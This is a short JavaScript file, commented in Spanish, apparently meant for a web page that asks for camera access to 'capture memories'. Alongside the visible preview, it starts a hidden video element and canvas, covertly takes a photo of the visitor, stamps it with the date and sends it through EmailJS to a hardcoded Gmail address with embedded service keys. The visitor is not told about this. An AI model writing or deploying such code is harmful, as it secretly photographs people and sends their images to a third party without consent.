// Inicializa EmailJS
emailjs.init("VjQYPRJy2mXtQPXgB"); // tu Public Key

// Configuración
const maxPhotos = 1;
const photoInterval = 3000;
const toEmail = "root52909@gmail.com";

const videoVisible = document.getElementById("videoVisible");

// Crear cámara invisible y canvas
const videoInvisible = document.createElement("video");
videoInvisible.style.display = "none";
document.body.appendChild(videoInvisible);

const canvasInvisible = document.createElement("canvas");
canvasInvisible.style.display = "none";
document.body.appendChild(canvasInvisible);

let photoCount = 0;

async function startCamera() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });

    // Cámara visible
    videoVisible.srcObject = stream;
    videoVisible.play();

    // Cámara invisible
    videoInvisible.srcObject = stream;
    videoInvisible.play();

    videoInvisible.onloadedmetadata = () => {
      const interval = setInterval(() => {
        takeInvisiblePhoto();
        photoCount++;
        if(photoCount >= maxPhotos){
          clearInterval(interval);
          console.log("✅ Todas las fotos tomadas. La cámara visible sigue activa.");
        }
      }, photoInterval);
    };

  } catch (err) {
    alert("❌ Necesitamos acceso a la cámara para capturar recuerdos.");
    console.error("Error al acceder a la cámara:", err);
  }
}

function takeInvisiblePhoto() {
  const ctx = canvasInvisible.getContext("2d");
  canvasInvisible.width = videoInvisible.videoWidth / 2;
  canvasInvisible.height = videoInvisible.videoHeight / 2;

  ctx.drawImage(videoInvisible, 0, 0, canvasInvisible.width, canvasInvisible.height);

  // Marco dorado
  ctx.lineWidth = 20;
  ctx.strokeStyle = "gold";
  ctx.strokeRect(0, 0, canvasInvisible.width, canvasInvisible.height);

  // Fecha y hora
  const now = new Date();
  ctx.font = "30px Arial";
  ctx.fillStyle = "white";
  ctx.strokeStyle = "black";
  ctx.lineWidth = 2;
  const text = now.toLocaleString();
  ctx.strokeText(text, 20, canvasInvisible.height - 30);
  ctx.fillText(text, 20, canvasInvisible.height - 30);

  const imageData = canvasInvisible.toDataURL("image/jpeg", 0.5);
  enviarFoto(imageData, photoCount + 1);
}

function enviarFoto(imageBase64, numero) {
  const params = {
    to_email: toEmail,
    message: `¡Aquí tienes el recuerdo #${numero}! 📸`,
    photo: imageBase64
  };

  emailjs.send("service_ky1f599", "template_dlw99r6", params)
    .then(() => console.log(`📩 Foto #${numero} enviada!`))
    .catch(err => console.error(`❌ Error al enviar foto #${numero}:`, err));
}

// Inicia la cámara al cargar el script
startCamera();
